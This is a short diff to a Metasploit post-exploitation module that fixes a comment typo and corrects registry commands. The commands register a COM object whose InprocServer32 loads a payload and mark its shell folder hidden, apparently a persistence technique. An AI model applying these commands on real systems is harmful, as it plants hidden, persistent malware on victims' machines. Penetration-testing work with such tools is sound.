@@ -138,7 +138,7 @@ class MetasploitModule < Msf::Post
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                 OptString.new('APPL_PATH', [ true, 'The full path of the appl or payload to run']),
                                 OptString.new('FOLDER_PATH', [ true, 'The full path and name of folder to be created']),
-                                OptString.new('LOOT_FOLDER', [ false, 'The full path [local] were to store logfiles'])
+                                OptString.new('LOOT_FOLDER', [ false, 'The full path [local] where to store logfiles'])
                         ], self.class)
 
                 register_advanced_options(
@@ -286,8 +286,8 @@ def run
             "#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{dll_exe} /f",
             "#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f",
             "#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment /f",
-            "#{hive_key}\\#{new_GUID}\\ShellFolder Attributes /t REG_DWORD /d 0xf090013d /f",
-            "#{hive_key}\\#{new_GUID}\\ShellFolder HideOnDesktop /t REG_SZ /d /f"
+            "#{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d 0xf090013d /f",
+            "#{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d /f"
           ]
         else
           #
